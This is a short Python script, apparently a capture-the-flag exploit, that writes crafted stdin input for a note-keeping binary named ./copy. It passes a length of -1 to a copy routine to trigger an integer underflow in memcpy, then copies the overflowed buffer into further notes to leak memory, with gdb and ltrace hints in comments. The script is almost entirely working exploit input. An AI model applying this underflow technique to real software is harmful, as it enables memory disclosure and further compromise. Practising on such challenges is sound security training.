#!/usr/bin/python
import sys

## gdb   break *  run < <(python challenge.py)
## python challenge.py | ltrace ./copy

## The way to memcpy
## Create notes
## Refer to notes by index (i.e. 0)
## Copy notes dst: 0
## src: 0
## len: ???

create_notes_option = b'0\n'
size_255 = b'255\n'
content_255 = b'B'*255+b'\n'
content_1 = b'C'+b'\n'

copy_notes_option   = b'1\n'
dst_option_0        = b'0\n'
src_option_0        = b'0\n'

# Integer underflow for memcpy
len_neg_1 = b'-1\n'

dst_option_1 = b'1\n'
len_255      = b'255\n'

option_0        = b'0\n'
option_1        = b'1\n'
option_2        = b'2\n'
option_3        = b'3\n'
option_4        = b'4\n'
option_5        = b'5\n'
option_6        = b'6\n'
option_7        = b'7\n'

payloads = {
    'create_note_initial': create_notes_option + size_255 + content_255,
    'create_note_full': create_notes_option + size_255 + content_255,

    ## memcpy(dst=0, src=0, len=overflow)
    'copy_note_underflow': copy_notes_option + dst_option_0 + src_option_0 + len_neg_1,

    ## memcpy(dst, src, len=255)
    'copy_from_leak_1': copy_notes_option + option_1 + option_0 + len_255,
    'copy_from_leak_2': copy_notes_option + option_2 + option_0 + len_255,
    'copy_from_leak_3': copy_notes_option + option_3 + option_0 + len_255,
    'copy_from_leak_4': copy_notes_option + option_4 + option_0 + len_255,
    'copy_from_leak_5': copy_notes_option + option_5 + option_0 + len_255,
    'copy_from_leak_6': copy_notes_option + option_6 + option_0 + len_255,
    'copy_from_leak_7': copy_notes_option + option_7 + option_0 + len_255
}

# Create two sets of notes
# 1. Create one set of notes
payload = payloads['create_note_initial']

# 2. create several other sets of notes
for i in range(7):
    payload += payloads['create_note_full']

# 3. memcpy underflow to copy lots of memory into that one note
payload += payloads['copy_note_underflow']

# 4. copy that one note into other notes?
payload += payloads['copy_from_leak_1']
payload += payloads['copy_from_leak_2']
payload += payloads['copy_from_leak_3']
payload += payloads['copy_from_leak_4']
payload += payloads['copy_from_leak_5']
payload += payloads['copy_from_leak_6']
payload += payloads['copy_from_leak_7']

sys.stdout.buffer.write(payload)
